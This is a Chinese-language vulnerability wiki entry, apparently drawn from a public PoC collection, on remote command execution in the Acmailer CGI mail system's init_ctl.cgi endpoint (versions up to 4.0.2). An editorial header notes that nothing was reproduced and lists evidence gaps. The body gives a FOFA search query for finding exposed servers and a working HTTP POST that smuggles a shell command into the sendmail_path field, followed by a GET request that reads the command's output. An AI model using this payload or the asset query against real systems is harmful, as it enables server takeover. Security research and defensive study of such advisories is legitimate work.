---
source: "wy876 漏洞文库"
title: "Acmailer邮件系统init_ctl存在远程命令执行漏洞"
product: "acmailer CGI"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Claims <=4.0.2; initialization endpoint accessibility and auth state unspecified"
fofa_unverified: "body="
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-b84650f9cc3b78e577fe3388"
entity_id: "ve-b84650f9cc3b78e577fe3388"
schema_version: "1"
---

# Acmailer邮件系统init_ctl存在远程命令执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Claims <=4.0.2; initialization endpoint accessibility and auth state unspecified
- 证据范围：POST supplies sendmail_path shell syntax then requests result file; state and exploit success evidence absent

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Blank Host, fixed Content-Length and unexplained sid cookie are copy-paste hazards; label as placeholders
- Explain whether initialization endpoint remains accessible after setup; broad takeover claim lacks shown evidence

### 操作风险与资料使用

- 文中的明文凭据、会话或密钥已用中段星号脱敏，保留首尾供比对；示例不能直接照抄登录。仅替换为自有隔离环境凭据，已暴露的真实凭据应撤销或轮换。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
Acmailer 是一款用于支持邮件服务的CGI软件。Acmailer邮件系统 init_ctl.cgi接口处远程命令执行,攻击者可通过此漏洞获取服务器权限。

# 二、影响版本
+ Version≤Acmailer 4.0.2

# 三、资产测绘
+ fofa`body="CGI acmailer"`
+ 特征


# 四、漏洞复现
```http
POST /init_ctl.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id > 13619.txt | bash&homeurl=http://&mypath=e
```


获取命令执行结果

```http
GET /13619.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Cookie: sid=a6************************36
Accept-Encoding: gzip, deflate
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wanndz3h73av7n0s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
